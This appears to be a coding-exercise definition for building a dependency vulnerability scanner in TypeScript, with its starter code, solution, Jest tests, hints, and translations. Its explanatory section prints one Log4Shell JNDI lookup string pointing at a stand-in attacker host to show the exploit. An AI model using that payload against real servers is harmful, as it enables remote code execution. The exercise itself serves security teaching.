import { Task } from '../../../../../../../types';

export const task: Task = {
	slug: 'secure-dependency-management',
	title: 'Managing Vulnerable Dependencies',
	difficulty: 'medium',
	tags: ['security', 'secure-coding', 'dependencies', 'supply-chain', 'typescript'],
	estimatedTime: '30m',
	isPremium: false,
	youtubeUrl: '',
	description: `Learn to identify and manage vulnerable dependencies in your projects.

**The Supply Chain Problem:**

Modern applications depend on hundreds of third-party packages. Each is a potential attack vector.

**Notable Supply Chain Attacks:**

| Incident | Year | Impact |
|----------|------|--------|
| event-stream | 2018 | Bitcoin wallet theft |
| ua-parser-js | 2021 | Crypto miners injected |
| Log4Shell | 2021 | Remote code execution |
| colors/faker | 2022 | Infinite loop sabotage |

**Vulnerability Sources:**

1. **Direct Dependencies** - Packages you explicitly install
2. **Transitive Dependencies** - Dependencies of dependencies
3. **Dev Dependencies** - Build tools that can inject malicious code

**Security Tools:**

\`\`\`bash
# npm
npm audit
npm audit fix

# Snyk
snyk test
snyk monitor

# OWASP Dependency-Check
dependency-check --project MyApp --scan .
\`\`\`

**Your Task:**

Implement a \`DependencyScanner\` class to analyze and manage dependencies.`,
	initialCode: `interface Dependency {
  name: string;
  version: string;
  isDev: boolean;
  dependencies?: string[]; // Transitive dependencies
}

interface Vulnerability {
  id: string;
  severity: 'low' | 'medium' | 'high' | 'critical';
  package: string;
  affectedVersions: string;
  fixedVersion?: string;
  description: string;
  cve?: string;
}

interface ScanResult {
  totalDependencies: number;
  vulnerabilities: Vulnerability[];
  riskScore: number; // 0-100
  outdatedCount: number;
}

interface DependencyUpdate {
  package: string;
  currentVersion: string;
  recommendedVersion: string;
  breaking: boolean;
}

class DependencyScanner {
  private knownVulnerabilities: Vulnerability[] = [
    { id: 'V001', severity: 'critical', package: 'lodash', affectedVersions: '<4.17.21', fixedVersion: '4.17.21', description: 'Prototype pollution', cve: 'CVE-2021-23337' },
    { id: 'V002', severity: 'high', package: 'axios', affectedVersions: '<0.21.1', fixedVersion: '0.21.1', description: 'SSRF vulnerability', cve: 'CVE-2020-28168' },
    { id: 'V003', severity: 'critical', package: 'log4j', affectedVersions: '<2.17.0', fixedVersion: '2.17.0', description: 'Remote code execution', cve: 'CVE-2021-44228' },
    { id: 'V004', severity: 'medium', package: 'moment', affectedVersions: '<2.29.2', fixedVersion: '2.29.2', description: 'ReDoS vulnerability', cve: 'CVE-2022-24785' },
  ];

  scanDependencies(dependencies: Dependency[]): ScanResult {
    // TODO: Scan dependencies for vulnerabilities
    return { totalDependencies: 0, vulnerabilities: [], riskScore: 0, outdatedCount: 0 };
  }

  findVulnerabilities(dep: Dependency): Vulnerability[] {
    // TODO: Find vulnerabilities for a specific dependency
    return [];
  }

  isVersionAffected(version: string, affectedVersions: string): boolean {
    // TODO: Check if version matches affected version pattern
    // Supports: <1.0.0, >=1.0.0 <2.0.0, 1.x
    return false;
  }

  calculateRiskScore(vulnerabilities: Vulnerability[]): number {
    // TODO: Calculate overall risk score (0-100)
    return 0;
  }

  suggestUpdates(dependencies: Dependency[]): DependencyUpdate[] {
    // TODO: Suggest updates for vulnerable packages
    return [];
  }

  getTransitiveDependencies(dependencies: Dependency[]): string[] {
    // TODO: Get all transitive dependencies
    return [];
  }

  hasCircularDependency(dependencies: Dependency[]): boolean {
    // TODO: Check for circular dependencies
    return false;
  }

  getSeverityWeight(severity: Vulnerability['severity']): number {
    // TODO: Return numeric weight for severity
    return 0;
  }

  generateReport(scanResult: ScanResult): string {
    // TODO: Generate human-readable report
    return '';
  }
}

export { DependencyScanner, Dependency, Vulnerability, ScanResult, DependencyUpdate };`,
	solutionCode: `interface Dependency {
  name: string;
  version: string;
  isDev: boolean;
  dependencies?: string[];
}

interface Vulnerability {
  id: string;
  severity: 'low' | 'medium' | 'high' | 'critical';
  package: string;
  affectedVersions: string;
  fixedVersion?: string;
  description: string;
  cve?: string;
}

interface ScanResult {
  totalDependencies: number;
  vulnerabilities: Vulnerability[];
  riskScore: number;
  outdatedCount: number;
}

interface DependencyUpdate {
  package: string;
  currentVersion: string;
  recommendedVersion: string;
  breaking: boolean;
}

class DependencyScanner {
  private knownVulnerabilities: Vulnerability[] = [
    { id: 'V001', severity: 'critical', package: 'lodash', affectedVersions: '<4.17.21', fixedVersion: '4.17.21', description: 'Prototype pollution', cve: 'CVE-2021-23337' },
    { id: 'V002', severity: 'high', package: 'axios', affectedVersions: '<0.21.1', fixedVersion: '0.21.1', description: 'SSRF vulnerability', cve: 'CVE-2020-28168' },
    { id: 'V003', severity: 'critical', package: 'log4j', affectedVersions: '<2.17.0', fixedVersion: '2.17.0', description: 'Remote code execution', cve: 'CVE-2021-44228' },
    { id: 'V004', severity: 'medium', package: 'moment', affectedVersions: '<2.29.2', fixedVersion: '2.29.2', description: 'ReDoS vulnerability', cve: 'CVE-2022-24785' },
  ];

  scanDependencies(dependencies: Dependency[]): ScanResult {
    const vulnerabilities: Vulnerability[] = [];
    let outdatedCount = 0;

    for (const dep of dependencies) {
      const vulns = this.findVulnerabilities(dep);
      vulnerabilities.push(...vulns);

      if (vulns.length > 0) {
        outdatedCount++;
      }
    }

    // Count transitive dependencies too
    const transitive = this.getTransitiveDependencies(dependencies);
    const totalDependencies = dependencies.length + transitive.length;

    return {
      totalDependencies,
      vulnerabilities,
      riskScore: this.calculateRiskScore(vulnerabilities),
      outdatedCount,
    };
  }

  findVulnerabilities(dep: Dependency): Vulnerability[] {
    return this.knownVulnerabilities.filter(vuln => {
      if (vuln.package.toLowerCase() !== dep.name.toLowerCase()) {
        return false;
      }
      return this.isVersionAffected(dep.version, vuln.affectedVersions);
    });
  }

  isVersionAffected(version: string, affectedVersions: string): boolean {
    // Parse version to components
    const parseVersion = (v: string): number[] => {
      return v.replace(/[^0-9.]/g, '').split('.').map(n => parseInt(n, 10) || 0);
    };

    const compareVersions = (a: number[], b: number[]): number => {
      for (let i = 0; i < Math.max(a.length, b.length); i++) {
        const va = a[i] || 0;
        const vb = b[i] || 0;
        if (va < vb) return -1;
        if (va > vb) return 1;
      }
      return 0;
    };

    const current = parseVersion(version);

    // Handle <X.Y.Z pattern
    if (affectedVersions.startsWith('<')) {
      const threshold = parseVersion(affectedVersions.slice(1));
      return compareVersions(current, threshold) < 0;
    }

    // Handle >=X.Y.Z <A.B.C pattern
    if (affectedVersions.includes(' ')) {
      const [lower, upper] = affectedVersions.split(' ');
      const lowerVersion = parseVersion(lower.replace('>=', ''));
      const upperVersion = parseVersion(upper.replace('<', ''));
      return compareVersions(current, lowerVersion) >= 0 &&
             compareVersions(current, upperVersion) < 0;
    }

    // Handle X.x pattern (any minor/patch)
    if (affectedVersions.includes('x')) {
      const prefix = affectedVersions.replace(/\.x.*/, '');
      return version.startsWith(prefix);
    }

    return false;
  }

  calculateRiskScore(vulnerabilities: Vulnerability[]): number {
    if (vulnerabilities.length === 0) return 0;

    let totalWeight = 0;
    for (const vuln of vulnerabilities) {
      totalWeight += this.getSeverityWeight(vuln.severity);
    }

    // Normalize to 0-100, max out at 100
    return Math.min(100, Math.round(totalWeight * 10));
  }

  suggestUpdates(dependencies: Dependency[]): DependencyUpdate[] {
    const updates: DependencyUpdate[] = [];

    for (const dep of dependencies) {
      const vulns = this.findVulnerabilities(dep);

      for (const vuln of vulns) {
        if (vuln.fixedVersion) {
          const currentMajor = parseInt(dep.version.split('.')[0], 10);
          const fixedMajor = parseInt(vuln.fixedVersion.split('.')[0], 10);

          updates.push({
            package: dep.name,
            currentVersion: dep.version,
            recommendedVersion: vuln.fixedVersion,
            breaking: fixedMajor > currentMajor,
          });
        }
      }
    }

    // Remove duplicates (keep highest recommended version)
    const unique = new Map<string, DependencyUpdate>();
    for (const update of updates) {
      const existing = unique.get(update.package);
      if (!existing || update.recommendedVersion > existing.recommendedVersion) {
        unique.set(update.package, update);
      }
    }

    return Array.from(unique.values());
  }

  getTransitiveDependencies(dependencies: Dependency[]): string[] {
    const all = new Set<string>();

    const collect = (deps?: string[]) => {
      if (!deps) return;
      for (const d of deps) {
        if (!all.has(d)) {
          all.add(d);
          const dep = dependencies.find(dep => dep.name === d);
          if (dep) collect(dep.dependencies);
        }
      }
    };

    for (const dep of dependencies) {
      collect(dep.dependencies);
    }

    return Array.from(all);
  }

  hasCircularDependency(dependencies: Dependency[]): boolean {
    const visited = new Set<string>();
    const stack = new Set<string>();

    const dfs = (name: string): boolean => {
      if (stack.has(name)) return true;
      if (visited.has(name)) return false;

      visited.add(name);
      stack.add(name);

      const dep = dependencies.find(d => d.name === name);
      if (dep?.dependencies) {
        for (const child of dep.dependencies) {
          if (dfs(child)) return true;
        }
      }

      stack.delete(name);
      return false;
    };

    for (const dep of dependencies) {
      if (dfs(dep.name)) return true;
    }

    return false;
  }

  getSeverityWeight(severity: Vulnerability['severity']): number {
    const weights: Record<Vulnerability['severity'], number> = {
      'low': 1,
      'medium': 3,
      'high': 7,
      'critical': 10,
    };
    return weights[severity];
  }

  generateReport(scanResult: ScanResult): string {
    const lines: string[] = [
      '=== Dependency Security Report ===',
      '',
      \`Total Dependencies: \${scanResult.totalDependencies}\`,
      \`Vulnerabilities Found: \${scanResult.vulnerabilities.length}\`,
      \`Risk Score: \${scanResult.riskScore}/100\`,
      \`Outdated Packages: \${scanResult.outdatedCount}\`,
      '',
    ];

    if (scanResult.vulnerabilities.length > 0) {
      lines.push('Vulnerabilities:');
      for (const vuln of scanResult.vulnerabilities) {
        lines.push(\`  [\${vuln.severity.toUpperCase()}] \${vuln.package}: \${vuln.description}\`);
        if (vuln.cve) lines.push(\`    CVE: \${vuln.cve}\`);
        if (vuln.fixedVersion) lines.push(\`    Fix: Upgrade to \${vuln.fixedVersion}\`);
      }
    } else {
      lines.push('No vulnerabilities found!');
    }

    return lines.join('\\n');
  }
}

export { DependencyScanner, Dependency, Vulnerability, ScanResult, DependencyUpdate };`,
	hint1: `For isVersionAffected, parse the semver and compare. Handle patterns like <1.0.0 (less than) and >=1.0.0 <2.0.0 (range).`,
	hint2: `For calculateRiskScore, sum up severity weights (critical=10, high=7, medium=3, low=1) and normalize to 0-100.`,
	testCode: `import { DependencyScanner } from './solution';

// Test1: scanDependencies counts correctly
test('Test1', () => {
  const scanner = new DependencyScanner();
  const result = scanner.scanDependencies([
    { name: 'express', version: '4.0.0', isDev: false },
    { name: 'jest', version: '27.0.0', isDev: true },
  ]);
  expect(result.totalDependencies).toBeGreaterThanOrEqual(2);
});

// Test2: findVulnerabilities detects known vulns
test('Test2', () => {
  const scanner = new DependencyScanner();
  const vulns = scanner.findVulnerabilities({ name: 'lodash', version: '4.17.0', isDev: false });
  expect(vulns.length).toBeGreaterThan(0);
  expect(vulns[0].severity).toBe('critical');
});

// Test3: isVersionAffected handles < pattern
test('Test3', () => {
  const scanner = new DependencyScanner();
  expect(scanner.isVersionAffected('4.17.0', '<4.17.21')).toBe(true);
  expect(scanner.isVersionAffected('4.17.21', '<4.17.21')).toBe(false);
});

// Test4: calculateRiskScore returns 0 for no vulns
test('Test4', () => {
  const scanner = new DependencyScanner();
  expect(scanner.calculateRiskScore([])).toBe(0);
});

// Test5: calculateRiskScore weights by severity
test('Test5', () => {
  const scanner = new DependencyScanner();
  const lowScore = scanner.calculateRiskScore([
    { id: '1', severity: 'low', package: 'x', affectedVersions: '', description: '' },
  ]);
  const criticalScore = scanner.calculateRiskScore([
    { id: '2', severity: 'critical', package: 'x', affectedVersions: '', description: '' },
  ]);
  expect(criticalScore).toBeGreaterThan(lowScore);
});

// Test6: suggestUpdates provides recommendations
test('Test6', () => {
  const scanner = new DependencyScanner();
  const updates = scanner.suggestUpdates([
    { name: 'lodash', version: '4.17.0', isDev: false },
  ]);
  expect(updates.length).toBeGreaterThan(0);
  expect(updates[0].recommendedVersion).toBe('4.17.21');
});

// Test7: getSeverityWeight returns correct values
test('Test7', () => {
  const scanner = new DependencyScanner();
  expect(scanner.getSeverityWeight('critical')).toBe(10);
  expect(scanner.getSeverityWeight('low')).toBe(1);
});

// Test8: generateReport includes summary
test('Test8', () => {
  const scanner = new DependencyScanner();
  const result = scanner.scanDependencies([
    { name: 'lodash', version: '4.17.0', isDev: false },
  ]);
  const report = scanner.generateReport(result);
  expect(report).toContain('Risk Score');
  expect(report).toContain('CRITICAL');
});

// Test9: getTransitiveDependencies collects nested
test('Test9', () => {
  const scanner = new DependencyScanner();
  const transitive = scanner.getTransitiveDependencies([
    { name: 'A', version: '1.0.0', isDev: false, dependencies: ['B'] },
    { name: 'B', version: '1.0.0', isDev: false, dependencies: ['C'] },
    { name: 'C', version: '1.0.0', isDev: false },
  ]);
  expect(transitive).toContain('B');
  expect(transitive).toContain('C');
});

// Test10: Safe package has no vulnerabilities
test('Test10', () => {
  const scanner = new DependencyScanner();
  const vulns = scanner.findVulnerabilities({ name: 'lodash', version: '4.17.21', isDev: false });
  expect(vulns.length).toBe(0);
});`,
	whyItMatters: `Supply chain attacks are increasing. Your code is only as secure as your weakest dependency.

**Log4Shell (CVE-2021-44228):**

\`\`\`
Impact: Remote Code Execution
Affected: log4j-core < 2.17.0
CVSS: 10.0 (Maximum severity)

Exploitation:
\${jndi:ldap://attacker.com/exploit}

One of the most severe vulnerabilities ever discovered.
Affected millions of Java applications worldwide.
\`\`\`

**Supply Chain Attack Trends:**

| Year | Notable Incidents |
|------|-------------------|
| 2018 | event-stream (Bitcoin theft) |
| 2020 | SolarWinds (Government breach) |
| 2021 | ua-parser-js, coa, rc (Malware) |
| 2022 | colors/faker (Sabotage) |
| 2023 | PyPI malware campaigns |

**Defense Strategies:**

1. **Lock files** - package-lock.json, yarn.lock
2. **Automated scanning** - npm audit, Snyk, Dependabot
3. **Pinned versions** - Avoid ^1.0.0, use exact versions
4. **Private registry** - Proxy public packages
5. **SBOM** - Software Bill of Materials
6. **Code review** - Check updates before merging`,
	order: 5,
	translations: {
		ru: {
			title: 'Управление уязвимыми зависимостями',
			description: `Научитесь выявлять и управлять уязвимыми зависимостями в проектах.

**Проблема Supply Chain:**

Современные приложения зависят от сотен сторонних пакетов. Каждый - потенциальный вектор атаки.

**Инструменты безопасности:**

\`\`\`bash
npm audit
npm audit fix
snyk test
\`\`\`

**Ваша задача:**

Реализуйте класс \`DependencyScanner\`.`,
			hint1: `Для isVersionAffected распарсите semver и сравните. Обработайте паттерны <1.0.0 и >=1.0.0 <2.0.0.`,
			hint2: `Для calculateRiskScore суммируйте веса по серьёзности (critical=10, high=7, medium=3, low=1) и нормализуйте до 0-100.`,
			whyItMatters: `Supply chain атаки растут. Ваш код безопасен настолько, насколько безопасна самая слабая зависимость.`
		},
		uz: {
			title: 'Zaif bog\'liqliklarni boshqarish',
			description: `Loyihalarda zaif bog'liqliklarni aniqlash va boshqarishni o'rganing.

**Supply Chain muammosi:**

Zamonaviy ilovalar yuzlab uchinchi tomon paketlariga bog'liq. Har biri potensial hujum vektori.

**Sizning vazifangiz:**

\`DependencyScanner\` klassini amalga oshiring.`,
			hint1: `isVersionAffected uchun semver ni parsing qiling va solishtiring. <1.0.0 va >=1.0.0 <2.0.0 patternlarni qayta ishlang.`,
			hint2: `calculateRiskScore uchun jiddiylik bo'yicha og'irliklarni yig'ing (critical=10, high=7, medium=3, low=1) va 0-100 ga normalizatsiya qiling.`,
			whyItMatters: `Supply chain hujumlari o'sib bormoqda. Sizning kodingiz eng zaif bog'liqlik darajasida xavfsiz.`
		}
	}
};

export default task;
